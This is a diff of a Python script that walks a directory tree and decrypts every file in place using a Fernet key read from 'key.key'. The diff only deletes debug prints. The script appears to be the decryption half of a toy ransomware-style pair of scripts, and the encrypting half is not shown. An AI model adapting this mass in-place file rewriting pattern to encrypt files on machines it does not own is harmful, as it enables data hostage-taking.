@@ -30,7 +30,6 @@ def list_files(base_dir):
 
         elif os.path.isfile(os.path.join(base_dir, entry)):
             all_files.append(os.path.join(base_dir, entry))
-        # print("****\nentry: {}\nall_files: {}\n****\n".format(entry, all_files))
 
 key = Fernet.generate_key()
 
@@ -39,14 +38,10 @@ list_files(root_dir)
 with open("key.key", "rb") as thekey:
     code = thekey.read()
 
-print("Code: ", code)
-
 for file in all_files:
     with open(file, "rb") as enc_file:
         contents = enc_file.read()
-    print("Contents of {}: {} ".format(file, contents))
     raw_contents = Fernet(code).decrypt(contents)
-    print("Raw contents: ", raw_contents)
     with open(file, "wb") as enc_file:
         enc_file.write(raw_contents)
 
